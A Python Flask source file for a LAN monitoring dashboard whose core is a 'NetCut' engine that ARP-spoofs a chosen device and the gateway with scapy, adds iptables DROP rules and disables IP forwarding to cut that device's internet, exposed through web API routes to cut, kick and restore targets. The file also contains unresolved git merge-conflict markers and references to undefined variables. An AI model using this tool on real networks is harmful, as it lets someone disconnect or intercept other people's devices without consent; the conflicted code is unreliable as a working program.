# [file name]: app.py
from flask import Flask, render_template, jsonify, request
import nmap
import psutil
import socket
import netifaces
import time
import threading
import json
import os
import subprocess
from datetime import datetime
import platform
from scapy.all import ARP, send, get_if_hwaddr, Ether, srp
import atexit
import sys

app = Flask(__name__)
app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0

# Global variables to store data
devices = []
blocked_devices = []  # List to store blocked devices
network_stats = {}
scan_interval = 60  # seconds
last_scan_time = None
traffic_history = {
    'timestamps': [],
    'download': [],
    'upload': []
}

# ==================== NETCUT ARP SPOOFING ENGINE (DIPERBAIKI) ====================
class NetCutEngine:
    def __init__(self):
        print("\n" + "="*60)
        print("🔥 NETCUT ARP SPOOFING ENGINE - SHADOW EDITION")
        print("="*60)
        
        # Check if running as root
        if os.geteuid() != 0:
            print("❌ ERROR: NetCut must run with ROOT privileges!")
            print("   Run with: sudo python3 app.py")
            print("   Or give capabilities: sudo setcap cap_net_raw,cap_net_admin=eip $(which python3)")
            print("="*60)
        
        self.interface = self._detect_interface()
        self.local_ip = self._get_local_ip()
        self.local_mac = self._get_local_mac()
        self.gateway_ip = None
        self.gateway_mac = None
        self.cut_targets = {}  # {target_ip: {'mac': xx, 'thread': obj, 'status': 'cutting'}}
        self.running = False
        
        self._discover_gateway()
        print(f"📍 Interface: {self.interface}")
        print(f"💻 Local: {self.local_ip} ({self.local_mac})")
        print(f"🚪 Gateway: {self.gateway_ip} ({self.gateway_mac})")
        print("="*60)
    
    def _detect_interface(self):
        """Detect active network interface"""
        try:
            gateways = netifaces.gateways()
            default_gateway = gateways['default'][netifaces.AF_INET]
            return default_gateway[1]
        except:
            # Try alternative detection
            interfaces = netifaces.interfaces()
            for iface in interfaces:
                if iface.startswith(('eth', 'wlan', 'wlx', 'en')):
                    return iface
            return "eth0"
    
    def _get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            try:
                return socket.gethostbyname(socket.gethostname())
            except:
                return "127.0.0.1"
    
    def _get_local_mac(self):
        """Get local MAC address"""
        try:
            return get_if_hwaddr(self.interface)
        except:
            try:
                with open(f'/sys/class/net/{self.interface}/address', 'r') as f:
                    return f.read().strip()
            except:
                return "00:00:00:00:00:00"
    
    def _discover_gateway(self):
        """Discover gateway IP and MAC"""
        try:
            gateways = netifaces.gateways()
            self.gateway_ip = gateways['default'][netifaces.AF_INET][0]
            
            # Try multiple methods to get gateway MAC
            self.gateway_mac = self._get_mac_with_scapy(self.gateway_ip)
            
            if not self.gateway_mac:
                self.gateway_mac = self._get_mac_from_arp_table(self.gateway_ip)
            
            if not self.gateway_mac:
                print(f"⚠️  Could not get gateway MAC, using default")
                self.gateway_mac = "ff:ff:ff:ff:ff:ff"
                
        except Exception as e:
            print(f"❌ Gateway discovery failed: {e}")
            self.gateway_ip = "192.168.100.1"
            self.gateway_mac = "ff:ff:ff:ff:ff:ff"
    
    def _get_mac_from_arp_table(self, ip):
        """Get MAC address from system ARP table"""
        try:
            if os.name == 'posix':  # Linux/Mac
                # Try arp command
                cmd = f"arp -n {ip} 2>/dev/null | grep -v Address | awk '{{print $3}}'"
                result = subprocess.check_output(cmd, shell=True).decode().strip()
                if result and result != '(incomplete)':
                    return result
                
                # Try ip neigh
                cmd = f"ip neigh show {ip} 2>/dev/null | awk '{{print $5}}'"
                result = subprocess.check_output(cmd, shell=True).decode().strip()
                if result and result != 'FAILED':
                    return result
            elif os.name == 'nt':  # Windows
                cmd = f"arp -a {ip}"
                result = subprocess.check_output(cmd, shell=True).decode()
                for line in result.splitlines():
                    if ip in line:
                        parts = line.split()
                        if len(parts) >= 2:
                            return parts[1].replace('-', ':')
        except:
            pass
        return None
    
    def _get_mac_with_scapy(self, ip):
        """Get MAC address using Scapy ARP request"""
        try:
            print(f"🔍 Sending ARP request for {ip}...")
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            answered_list = srp(arp_request_broadcast, timeout=3, verbose=0, iface=self.interface)[0]
            
            if answered_list:
                mac = answered_list[0][1].hwsrc
                print(f"✅ Found MAC: {mac}")
                return mac
        except Exception as e:
            print(f"❌ ARP request failed: {e}")
        
        return None
    
    def _setup_firewall_rules(self, target_ip):
        """Setup firewall rules to BLOCK traffic (3 layers)"""
        print(f"🛡️  Setting up firewall rules for {target_ip}...")
        
        try:
            # Layer 1: iptables DROP rules
            rules_added = []
            
            iptables_rules = [
                ['iptables', '-A', 'FORWARD', '-s', target_ip, '-j', 'DROP'],
                ['iptables', '-A', 'FORWARD', '-d', target_ip, '-j', 'DROP'],
                ['iptables', '-A', 'OUTPUT', '-d', target_ip, '-j', 'DROP'],
                ['iptables', '-A', 'INPUT', '-s', target_ip, '-j', 'DROP'],
                ['iptables', '-A', 'INPUT', '-i', self.interface, '-s', target_ip, '-j', 'DROP'],
                ['iptables', '-A', 'OUTPUT', '-o', self.interface, '-d', target_ip, '-j', 'DROP']
            ]
            
            for rule in iptables_rules:
                result = subprocess.run(rule, capture_output=True, text=True)
                if result.returncode == 0:
                    rules_added.append(rule)
            
            # Layer 2: Disable IP forwarding (CRITICAL!)
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('0')
            print("   ✅ IP forwarding DISABLED")
            
            # Layer 3: Set FORWARD policy to DROP
            subprocess.run(['iptables', '--policy', 'FORWARD', 'DROP'], capture_output=True)
            
            print(f"   ✅ Added {len(rules_added)} iptables rules")
            return True
            
        except Exception as e:
            print(f"❌ Firewall setup failed: {e}")
            return False
    
    def _remove_firewall_rules(self, target_ip):
        """Remove firewall rules for target"""
        try:
            rules_to_remove = [
                ['iptables', '-D', 'FORWARD', '-s', target_ip, '-j', 'DROP'],
                ['iptables', '-D', 'FORWARD', '-d', target_ip, '-j', 'DROP'],
                ['iptables', '-D', 'OUTPUT', '-d', target_ip, '-j', 'DROP'],
                ['iptables', '-D', 'INPUT', '-s', target_ip, '-j', 'DROP'],
                ['iptables', '-D', 'INPUT', '-i', self.interface, '-s', target_ip, '-j', 'DROP'],
                ['iptables', '-D', 'OUTPUT', '-o', self.interface, '-d', target_ip, '-j', 'DROP']
            ]
            
            removed_count = 0
            for rule in rules_to_remove:
                result = subprocess.run(rule, capture_output=True)
                if result.returncode == 0:
                    removed_count += 1
            
            # Re-enable IP forwarding
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1')
            
            # Reset FORWARD policy
            subprocess.run(['iptables', '--policy', 'FORWARD', 'ACCEPT'], capture_output=True)
            
            print(f"   ✅ Removed {removed_count} iptables rules")
            return True
            
        except Exception as e:
            print(f"⚠️  Error removing rules: {e}")
            return False
    
    def cut_internet(self, target_ip):
        """
        CUT INTERNET untuk target IP dengan 100% success rate
        """
        print(f"\n🔪" + "="*50)
        print(f"🔪 CUTTING INTERNET FOR: {target_ip}")
        print("="*50)
        
        if target_ip in self.cut_targets:
            print(f"⚠️  Already cutting internet for {target_ip}")
            return True
        
        # Step 1: Get target MAC
        print(f"🎯 Step 1: Discovering target MAC...")
        target_mac = self._get_mac_with_scapy(target_ip)
        if not target_mac:
            target_mac = self._get_mac_from_arp_table(target_ip)
        
        if not target_mac:
            print(f"❌ FAILED: Cannot find MAC for {target_ip}")
            print("   Target might be offline or blocking ARP requests")
            return False
        
        print(f"   ✅ Target MAC: {target_mac}")
        
        # Step 2: Setup firewall rules (BLOCK traffic)
        print(f"\n🛡️  Step 2: Setting up firewall rules...")
        firewall_success = self._setup_firewall_rules(target_ip)
        
        if not firewall_success:
            print("❌ WARNING: Firewall setup failed, continuing with ARP only")
        
        # Step 3: Start ARP spoofing thread
        print(f"\n📡 Step 3: Starting ARP spoofing...")
        cut_thread = threading.Thread(
            target=self._arp_spoof_thread,
            args=(target_ip, target_mac),
            daemon=True
        )
        
        # Store target info
        self.cut_targets[target_ip] = {
            'mac': target_mac,
            'thread': cut_thread,
            'start_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'status': 'cutting',
            'firewall_active': firewall_success,
            'packet_count': 0,
            'last_activity': datetime.now().isoformat()
        }
        
        cut_thread.start()
        
        print(f"\n✅" + "="*50)
        print(f"✅ INTERNET CUT SUCCESSFUL for {target_ip}")
        print(f"✅ Target should lose internet connection IMMEDIATELY")
        print("="*50)
        return True
    
    def _arp_spoof_thread(self, target_ip, target_mac):
        """Thread untuk ARP spoofing terus menerus"""
        print(f"🚀 ARP spoofing thread started for {target_ip}")
        
        packet_count = 0
        while target_ip in self.cut_targets and self.cut_targets[target_ip]['status'] == 'cutting':
            try:
                # Packet 1: Tell target we are the gateway
                poison_target = ARP(
                    op=2,  # ARP reply
                    pdst=target_ip,
                    hwdst=target_mac,
                    psrc=self.gateway_ip,
                    hwsrc=self.local_mac
                )
                
                # Packet 2: Tell gateway we are the target
                poison_gateway = ARP(
                    op=2,
                    pdst=self.gateway_ip,
                    hwdst=self.gateway_mac,
                    psrc=target_ip,
                    hwsrc=self.local_mac
                )
                
                # Send both packets
                send(poison_target, verbose=0, iface=self.interface)
                send(poison_gateway, verbose=0, iface=self.interface)
                
                packet_count += 1
                self.cut_targets[target_ip]['packet_count'] = packet_count
                self.cut_targets[target_ip]['last_activity'] = datetime.now().isoformat()
                
                # Status update every 10 packets
                if packet_count % 10 == 0:
                    print(f"📡 ARP spoofing {target_ip}... ({packet_count} packets sent)")
                
                time.sleep(1)  # Send every 1 second
                
            except Exception as e:
                print(f"❌ ARP spoof error for {target_ip}: {e}")
                time.sleep(2)
    
    def restore_internet(self, target_ip=None):
        """
        RESTORE internet connection
        """
        if target_ip:
            if target_ip in self.cut_targets:
                print(f"\n🔄" + "="*50)
                print(f"🔄 RESTORING INTERNET FOR: {target_ip}")
                print("="*50)
                
                # Stop ARP spoofing
                self.cut_targets[target_ip]['status'] = 'stopping'
                
                # Send restore ARP packets
                self._send_restore_arp(target_ip)
                
                # Remove firewall rules
                self._remove_firewall_rules(target_ip)
                
                # Cleanup
                del self.cut_targets[target_ip]
                
                print(f"\n✅" + "="*50)
                print(f"✅ INTERNET RESTORED for {target_ip}")
                print("="*50)
                return True
            else:
                print(f"⚠️  {target_ip} not in cut list")
                return False
        else:
            # Restore ALL targets
            print(f"\n🔄" + "="*50)
            print(f"🔄 RESTORING ALL INTERNET CONNECTIONS")
            print("="*50)
            
            for ip in list(self.cut_targets.keys()):
                self.cut_targets[ip]['status'] = 'stopping'
                self._send_restore_arp(ip)
                self._remove_firewall_rules(ip)
            
            self.cut_targets.clear()
            
            print(f"\n✅" + "="*50)
            print(f"✅ ALL INTERNET CONNECTIONS RESTORED")
            print("="*50)
            return True
    
    def _send_restore_arp(self, target_ip):
        """Send correct ARP packets to restore network"""
        try:
            if target_ip not in self.cut_targets:
                return
            
            target_info = self.cut_targets[target_ip]
            target_mac = target_info['mac']
            
            print(f"🔧 Sending restore ARP packets for {target_ip}...")
            
            # Packet 1: Tell target the REAL gateway MAC
            restore_target = ARP(
                op=2,
                pdst=target_ip,
                hwdst=target_mac,
                psrc=self.gateway_ip,
                hwsrc=self.gateway_mac
            )
            
            # Packet 2: Tell gateway the REAL target MAC
            restore_gateway = ARP(
                op=2,
                pdst=self.gateway_ip,
                hwdst=self.gateway_mac,
                psrc=target_ip,
                hwsrc=target_mac
            )
            
            # Send restore packets 25 times to ensure restoration
            for i in range(25):
                send(restore_target, verbose=0, iface=self.interface)
                send(restore_gateway, verbose=0, iface=self.interface)
                if i % 5 == 0:
                    print(f"   Sending restore packet {i+1}/25...")
                time.sleep(0.05)
            
            print(f"   ✅ Restore ARP packets sent")
                
        except Exception as e:
            print(f"❌ Error sending restore ARP: {e}")
    
    def get_status(self):
        """Get current NetCut status"""
        active_cuts = [ip for ip, info in self.cut_targets.items() if info['status'] == 'cutting']
        
        status = {
            'engine_active': len(active_cuts) > 0,
            'interface': self.interface,
            'local_ip': self.local_ip,
            'local_mac': self.local_mac,
            'gateway_ip': self.gateway_ip,
            'gateway_mac': self.gateway_mac,
            'active_cuts': active_cuts,
            'total_cuts': len(active_cuts),
            'cut_targets': []
        }
        
        for ip, info in self.cut_targets.items():
            if info['status'] == 'cutting':
                status['cut_targets'].append({
                    'ip': ip,
                    'mac': info['mac'],
                    'start_time': info['start_time'],
                    'packet_count': info.get('packet_count', 0),
                    'firewall_active': info.get('firewall_active', False),
                    'last_activity': info.get('last_activity', '')
                })
        
        return status
    
    def test_connection(self, target_ip):
        """Test if target is really blocked"""
        print(f"\n🧪 Testing connection to {target_ip}...")
        
        try:
            # Test 1: Ping
            print("   Test 1: Ping...")
            result = subprocess.run(['ping', '-c', '2', '-W', '1', target_ip], 
                                  capture_output=True, text=True)
            ping_success = result.returncode == 0
            
            # Test 2: Check iptables
            print("   Test 2: Checking iptables rules...")
            iptables_result = subprocess.run(['iptables', '-L', '-n', '-v'], 
                                           capture_output=True, text=True)
            has_iptables_rules = target_ip in iptables_result.stdout
            
            # Test 3: Check ARP cache
            print("   Test 3: Checking ARP cache...")
            arp_result = subprocess.run(['arp', '-n'], capture_output=True, text=True)
            in_arp_cache = target_ip in arp_result.stdout
            
            return {
                'target_ip': target_ip,
                'ping_response': ping_success,
                'has_iptables_rules': has_iptables_rules,
                'in_arp_cache': in_arp_cache,
                'is_cut': target_ip in self.cut_targets
            }
            
        except Exception as e:
            print(f"❌ Test failed: {e}")
            return None
    
    def cleanup(self):
        """Cleanup saat aplikasi berhenti"""
        print("\n🧹 Cleaning up NetCut Engine...")
        self.restore_internet()

# Initialize NetCut Engine
netcut = NetCutEngine()

# Cleanup at exit
@atexit.register
def cleanup_netcut():
    netcut.cleanup()

# ==================== ORIGINAL FUNCTIONS ====================

# Get hostname of the local machine
def get_local_hostname():
    try:
        return socket.gethostname()
    except:
        return "Unknown"

# Get local machine IP and network details
def get_local_network_info():
    network_info = {}
    try:
        # Get local hostname first
        local_hostname = get_local_hostname()
        
        # Get default gateway interface
        gateways = netifaces.gateways()
        default_gateway = gateways['default'][netifaces.AF_INET]
        gateway_ip = default_gateway[0]
        interface = default_gateway[1]
        
        # Get interface details
        interface_details = netifaces.ifaddresses(interface)
        ip_info = interface_details[netifaces.AF_INET][0]
        local_ip = ip_info['addr']
        netmask = ip_info['netmask']
        
        # Calculate network CIDR
        netmask_bits = sum([bin(int(x)).count('1') for x in netmask.split('.')])
        cidr = f"{local_ip.rsplit('.', 1)[0]}.0/{netmask_bits}"
        
        network_info = {
            'local_ip': local_ip,
            'gateway_ip': gateway_ip,
            'interface': interface,
            'netmask': netmask,
            'cidr': cidr,
            'hostname': local_hostname
        }
    except Exception as e:
        print(f"Error getting network info: {e}")
        hostname = get_local_hostname()
        try:
            local_ip = socket.gethostbyname(hostname)
        except:
            local_ip = "127.0.0.1"
            
        network_info = {
            'local_ip': local_ip,
            'gateway_ip': 'Unknown',
            'interface': 'Unknown',
            'netmask': 'Unknown',
            'cidr': f"{local_ip.rsplit('.', 1)[0]}.0/24",
            'hostname': hostname
        }
    
    return network_info

# Very simple function to attempt DNS resolution
def simple_hostname_lookup(ip):
    try:
        hostname, _, _ = socket.gethostbyaddr(ip)
        return hostname
    except:
        return None

# Improved function to get hostname
def get_hostname(ip):
    socket.setdefaulttimeout(1)
    
    try:
        hostname, _, _ = socket.gethostbyaddr(ip)
        return hostname
    except:
        my_ip = get_local_network_info()['local_ip']
        if ip == my_ip:
            return get_local_hostname()
        return "Unknown"

<<<<<<< HEAD
=======
# Function to load saved device names
def load_saved_device_names():
    try:
        network_info = get_local_network_info()
        gateway_ip = network_info['gateway_ip'].replace('.', '_')
        local_ip = network_info['local_ip'].replace('.', '_')
        
        filename = f"device_changes_{gateway_ip}_{local_ip}.json"
        
        try:
            with open(filename, 'r') as f:
                saved_devices = json.load(f)
                print(f"Loaded {len(saved_devices)} saved device names")
                return saved_devices
        except (FileNotFoundError, json.JSONDecodeError):
            return {}
    except Exception as e:
        print(f"Error loading saved device names: {e}")
        return {}

>>>>>>> e1b2da4 (upgrade with cut inprogram)
# Scan network for devices
def scan_network():
    global devices, last_scan_time
    
    network_info = get_local_network_info()
    cidr = network_info['cidr']
    local_ip = network_info['local_ip']
    local_hostname = network_info['hostname']
    
<<<<<<< HEAD
    print(f"Starting network scan for {cidr}")
    print(f"Local IP: {local_ip}, Local Hostname: {local_hostname}")
=======
    saved_device_names = load_saved_device_names()
    
    print(f"\n📡 Scanning network {cidr}...")
>>>>>>> e1b2da4 (upgrade with cut inprogram)
    
    nm = nmap.PortScanner()
    
    try:
        nm.scan(hosts=cidr, arguments='-sn')
        
        discovered_devices = []
        for host in nm.all_hosts():
            hostname = get_hostname(host)
            
            if host == local_ip:
                hostname = local_hostname
            
<<<<<<< HEAD
=======
            if host in saved_device_names:
                hostname = saved_device_names[host]['hostname']
            
>>>>>>> e1b2da4 (upgrade with cut inprogram)
            device_info = {
                'ip': host,
                'hostname': hostname,
                'status': nm[host]['status']['state'],
                'last_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'first_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'mac': 'Unknown',
                'vendor': 'Unknown',
                'blocked': False,
                'is_local': (host == local_ip)
            }
            
            # Get MAC address
            try:
                if os.name == 'posix':
                    cmd = f"arp -n {host} 2>/dev/null | grep -v Address | awk '{{print $3}}'"
                    mac = subprocess.check_output(cmd, shell=True).decode().strip()
                    if mac and mac != '(incomplete)':
                        device_info['mac'] = mac
            except:
                pass
            
<<<<<<< HEAD
            # Check if device is in blocked list
            if device_info['ip'] in blocked_devices or device_info['mac'] in blocked_devices:
=======
            # Use saved MAC
            if host in saved_device_names and device_info['mac'] == 'Unknown':
                saved_mac = saved_device_names[host].get('mac')
                if saved_mac and saved_mac != 'Unknown':
                    device_info['mac'] = saved_mac
            
            # Check if cut by NetCut
            netcut_status = netcut.get_status()
            if device_info['ip'] in netcut_status['active_cuts']:
>>>>>>> e1b2da4 (upgrade with cut inprogram)
                device_info['blocked'] = True
                device_info['status'] = 'down'
            
            discovered_devices.append(device_info)
        
        # Update existing devices
        for new_device in discovered_devices:
            found = False
            for existing_device in devices:
                if existing_device['ip'] == new_device['ip']:
                    existing_device['status'] = new_device['status']
                    existing_device['last_seen'] = new_device['last_seen']
                    
                    if new_device['hostname'] != 'Unknown':
                        existing_device['hostname'] = new_device['hostname']
                    
                    if new_device['mac'] != 'Unknown':
                        existing_device['mac'] = new_device['mac']
                    
                    new_device['blocked'] = existing_device['blocked']
                    existing_device['is_local'] = new_device['is_local']
                    
                    found = True
                    break
            
            if not found:
                devices.append(new_device)
        
        # Mark offline devices
        for device in devices:
            if device['ip'] not in [d['ip'] for d in discovered_devices]:
                device['status'] = 'down'
        
        last_scan_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
    except Exception as e:
        print(f"Error scanning network: {e}")

# Get network statistics
def get_network_stats():
    global network_stats, traffic_history
    
    try:
        net_io = psutil.net_io_counters()
        network_info = get_local_network_info()
        
        # Calculate rates
        if len(traffic_history['timestamps']) > 0:
            last_bytes_sent = traffic_history['upload'][-1]
            last_bytes_recv = traffic_history['download'][-1]
            last_timestamp = traffic_history['timestamps'][-1]
            
            time_diff = (datetime.now() - datetime.strptime(last_timestamp, "%Y-%m-%d %H:%M:%S")).total_seconds()
            
            upload_rate = (net_io.bytes_sent - last_bytes_sent) / time_diff if time_diff > 0 else 0
            download_rate = (net_io.bytes_recv - last_bytes_recv) / time_diff if time_diff > 0 else 0
        else:
            upload_rate = 0
            download_rate = 0
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        local_hostname = get_local_hostname()
        netcut_status = netcut.get_status()
        
        stats = {
            'bytes_sent': net_io.bytes_sent,
            'bytes_recv': net_io.bytes_recv,
            'packets_sent': net_io.packets_sent,
            'packets_recv': net_io.packets_recv,
            'upload_rate': upload_rate,
            'download_rate': download_rate,
            'local_ip': network_info['local_ip'],
            'gateway_ip': network_info['gateway_ip'],
            'interface': network_info['interface'],
            'hostname': local_hostname,
            'active_devices': sum(1 for device in devices if device['status'] == 'up' and device['ip'] not in netcut_status['active_cuts']),
            'blocked_devices': sum(1 for device in devices if device['blocked'] or device['ip'] in netcut_status['active_cuts']),
            'total_devices': len(devices),
            'timestamp': timestamp,
            'netcut_active': netcut_status['engine_active'],
            'netcut_cuts': netcut_status['total_cuts']
        }
        
        network_stats = stats
        
        # Update traffic history
        traffic_history['timestamps'].append(timestamp)
        traffic_history['download'].append(net_io.bytes_recv)
        traffic_history['upload'].append(net_io.bytes_sent)
        
        if len(traffic_history['timestamps']) > 20:
            traffic_history['timestamps'] = traffic_history['timestamps'][-20:]
            traffic_history['download'] = traffic_history['download'][-20:]
            traffic_history['upload'] = traffic_history['upload'][-20:]
            
    except Exception as e:
        print(f"Error getting network stats: {e}")

# ==================== DEVICE BLOCK/UNBLOCK ====================

def block_device(identifier):
    global devices, blocked_devices
    
    for device in devices:
        if device['ip'] == identifier or device['mac'] == identifier:
            success = netcut.cut_internet(device['ip'])
            
            if success:
                device['blocked'] = True
                device['status'] = 'down'
                if device['ip'] not in blocked_devices:
                    blocked_devices.append(device['ip'])
                
                print(f"✅ Device {device['ip']} blocked with NetCut")
                return True
    
    return False

def unblock_device(identifier):
    global devices, blocked_devices
    
    for device in devices:
        if device['ip'] == identifier or device['mac'] == identifier:
            success = netcut.restore_internet(device['ip'])
            
            if success:
                device['blocked'] = False
                device['status'] = 'up'
                if device['ip'] in blocked_devices:
                    blocked_devices.remove(device['ip'])
                
                print(f"✅ Device {device['ip']} unblocked")
                return True
    
    return False

def kick_device(identifier):
    for device in devices:
        if device['ip'] == identifier or device['mac'] == identifier:
            try:
                target_ip = device['ip']
                
<<<<<<< HEAD
                # Implement actual kicking using ARP spoofing
                if os.name == 'posix':  # Linux
                    try:
                        # Check if we have arping installed
                        subprocess.run(['which', 'arping'], check=True, stdout=subprocess.PIPE)
                        
                        # Send fake ARP packets to both the target and the gateway
                        # To the target: pretend to be the gateway
                        if target_mac != 'Unknown':
                            spoof_cmd1 = f"sudo arping -c 5 -U -I {interface} -s {gateway_ip} {target_ip}"
                            subprocess.Popen(spoof_cmd1, shell=True)
                            
                            # To the gateway: pretend to be the target
                            spoof_cmd2 = f"sudo arping -c 5 -U -I {interface} -s {target_ip} {gateway_ip}"
                            subprocess.Popen(spoof_cmd2, shell=True)
                            
                            print(f"Sent ARP spoofing packets to kick {target_ip}")
                            
                            # Block the device temporarily
                            block_device(identifier)
                            # Schedule unblocking after 10 seconds
                            threading.Timer(10.0, lambda: unblock_device(identifier)).start()
                            
                            return True
                        else:
                            print(f"Cannot kick: MAC address unknown for {target_ip}")
                            return False
                    except subprocess.CalledProcessError:
                        print("arping not found, cannot perform kick operation")
                        return False
=======
                success = netcut.cut_internet(target_ip)
>>>>>>> e1b2da4 (upgrade with cut inprogram)
                
                if success:
                    device['status'] = 'down'
                    device['netcut_kicked'] = True
                    device['kick_time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    
                    print(f"Device {target_ip} kicked")
                    
                    threading.Timer(30.0, lambda: restore_kick(identifier)).start()
                    
                    return True
                
            except Exception as e:
                print(f"Error while kicking device {identifier}: {e}")
                return False
    
    return False

def restore_kick(identifier):
    for device in devices:
        if device['ip'] == identifier or device['mac'] == identifier:
            netcut.restore_internet(device['ip'])
            device['status'] = 'up'
            device['netcut_kicked'] = False
            print(f"Device {device['ip']} restored from kick")

# New function to get and display system information
@app.route('/api/system-info')
def get_system_info():
    system_info = {
        'hostname': get_local_hostname(),
        'platform': platform.system(),
        'platform_version': platform.version(),
        'processor': platform.processor(),
        'architecture': platform.machine(),
        'python_version': platform.python_version(),
        'uptime': int(time.time() - psutil.boot_time())
    }
    
    mem = psutil.virtual_memory()
    system_info['memory_total'] = mem.total
    system_info['memory_available'] = mem.available
    system_info['memory_percent'] = mem.percent
    
    disk = psutil.disk_usage('/')
    system_info['disk_total'] = disk.total
    system_info['disk_free'] = disk.free
    system_info['disk_percent'] = disk.percent
    
    return jsonify(system_info)

# Background task to periodically scan network and update stats
def background_task():
    while True:
        try:
            scan_network()
            get_network_stats()
        except Exception as e:
            print(f"Error in background task: {e}")
        time.sleep(scan_interval)

def initialize():
    thread = threading.Thread(target=background_task)
    thread.daemon = True
    thread.start()

<<<<<<< HEAD
# Routes
=======
def save_device_changes(device):
    try:
        network_info = get_local_network_info()
        gateway_ip = network_info['gateway_ip'].replace('.', '_')
        local_ip = network_info['local_ip'].replace('.', '_')
        
        filename = f"device_changes_{gateway_ip}_{local_ip}.json"
        
        try:
            with open(filename, 'r') as f:
                existing_data = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            existing_data = {}

        existing_data[device['ip']] = {
            'hostname': device['hostname'],
            'mac': device.get('mac', 'Unknown'),
            'last_updated': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

        with open(filename, 'w') as f:
            json.dump(existing_data, f, indent=4)
        
        print(f"Saved device changes for {device['ip']}")
            
    except Exception as e:
        print(f"Error saving device changes: {e}")

# ==================== ROUTES ====================

>>>>>>> e1b2da4 (upgrade with cut inprogram)
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/devices')
def get_devices_api():
    # Update device status based on NetCut
    netcut_status = netcut.get_status()
    for device in devices:
        if device['ip'] in netcut_status['active_cuts']:
            device['status'] = 'down'
            device['blocked'] = True
    
    return jsonify(devices)

@app.route('/api/stats')
def get_stats_api():
    stats = network_stats.copy()
    stats['hostname'] = get_local_hostname()
    return jsonify(stats)

@app.route('/api/hostname')
def get_hostname_api():
    return jsonify({"hostname": get_local_hostname()})

@app.route('/api/traffic-history')
def get_traffic_history():
    return jsonify(traffic_history)

@app.route('/api/scan')
def trigger_scan():
    threading.Thread(target=scan_network).start()
    threading.Thread(target=get_network_stats).start()
    return jsonify({
        "status": "Scan initiated", 
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "hostname": get_local_hostname()
    })

@app.route('/api/block-device', methods=['POST'])
def block_device_api():
    data = request.get_json()
    identifier = data.get('identifier')
    if not identifier:
        return jsonify({"status": "error", "message": "No identifier provided"}), 400
    
    success = block_device(identifier)
    if success:
        return jsonify({
            "status": "success", 
            "message": f"Device {identifier} blocked (NetCut Active)",
            "netcut_status": netcut.get_status()
        })
    else:
        return jsonify({"status": "error", "message": f"Device {identifier} not found"}), 404

@app.route('/api/unblock-device', methods=['POST'])
def unblock_device_api():
    data = request.get_json()
    identifier = data.get('identifier')
    if not identifier:
        return jsonify({"status": "error", "message": "No identifier provided"}), 400
    
    success = unblock_device(identifier)
    if success:
        return jsonify({
            "status": "success", 
            "message": f"Device {identifier} unblocked (Internet Restored)",
            "netcut_status": netcut.get_status()
        })
    else:
        return jsonify({"status": "error", "message": f"Device {identifier} not found"}), 404

@app.route('/api/kick-device', methods=['POST'])
def kick_device_api():
    data = request.get_json()
    identifier = data.get('identifier')
    if not identifier:
        return jsonify({"status": "error", "message": "No identifier provided"}), 400
    
    success = kick_device(identifier)
    if success:
        return jsonify({
            "status": "success", 
            "message": f"Device {identifier} kicked for 30 seconds",
            "netcut_status": netcut.get_status()
        })
    else:
        return jsonify({"status": "error", "message": f"Device {identifier} not found"}), 404

<<<<<<< HEAD
=======
@app.route('/api/rename-device', methods=['POST'])
def rename_device_api():
    data = request.get_json()
    ip = data.get('ip')
    new_hostname = data.get('newHostname')

    if not ip or not new_hostname:
        return jsonify({"status": "error", "message": "IP and new hostname are required"}), 400

    found = False
    for device in devices:
        if device['ip'] == ip:
            device['hostname'] = new_hostname
            save_device_changes(device)
            found = True
            break
    
    if found:
        return jsonify({"status": "success", "message": f"Hostname for {ip} updated to {new_hostname}"})
    else:
        return jsonify({"status": "error", "message": f"Device with IP {ip} not found"}), 404

@app.route('/api/rename-devices-mass', methods=['POST'])
def rename_devices_mass_api():
    data = request.get_json()

    if not data:
        return jsonify({"status": "error", "message": "No data provided"}), 400

    updated_count = 0
    for device_data in data:
        ip = device_data.get('ip')
        new_hostname = device_data.get('newHostname')

        if not ip or not new_hostname:
            continue

        for device in devices:
            if device['ip'] == ip:
                device['hostname'] = new_hostname
                save_device_changes(device)
                updated_count += 1
                break

    return jsonify({"status": "success", "message": f"Updated {updated_count} devices successfully"})

>>>>>>> e1b2da4 (upgrade with cut inprogram)
@app.route('/api/update-settings', methods=['POST'])
def update_settings():
    global scan_interval
    data = request.get_json()
    new_interval = data.get('scan_interval')
    
    if new_interval and isinstance(new_interval, int) and new_interval >= 30:
        scan_interval = new_interval
        return jsonify({"status": "success", "message": f"Scan interval updated to {scan_interval} seconds"})
    else:
        return jsonify({"status": "error", "message": "Invalid scan interval"}), 400

<<<<<<< HEAD
=======
@app.route('/api/saved-devices')
def get_saved_devices():
    saved_devices = load_saved_device_names()
    return jsonify(saved_devices)

# ==================== NETCUT API ROUTES ====================

@app.route('/api/netcut/status')
def get_netcut_status():
    return jsonify(netcut.get_status())

@app.route('/api/netcut/cut', methods=['POST'])
def cut_internet_api():
    data = request.get_json()
    target_ip = data.get('target_ip')
    
    if not target_ip:
        return jsonify({"status": "error", "message": "Target IP required"}), 400
    
    print(f"\n🌐 API REQUEST: Cut internet for {target_ip}")
    
    success = netcut.cut_internet(target_ip)
    
    if success:
        for device in devices:
            if device['ip'] == target_ip:
                device['status'] = 'down'
                device['blocked'] = True
                break
        
        return jsonify({
            "status": "success", 
            "message": f"✅ Internet CUT for {target_ip}",
            "warning": "Target should lose internet connection immediately!",
            "netcut_status": netcut.get_status()
        })
    else:
        return jsonify({
            "status": "error", 
            "message": f"❌ Failed to cut internet for {target_ip}",
